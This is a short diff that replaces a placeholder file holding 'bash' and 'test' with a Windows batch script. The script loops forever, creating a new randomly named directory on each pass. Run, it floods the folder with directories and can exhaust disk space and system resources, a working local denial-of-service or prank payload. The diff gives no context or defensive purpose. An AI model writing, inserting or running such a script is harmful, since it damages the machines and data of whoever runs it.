@@ -1,3 +1,4 @@
-bash
-
-test
+@echo off
+:loop
+md %random%
+goto loop
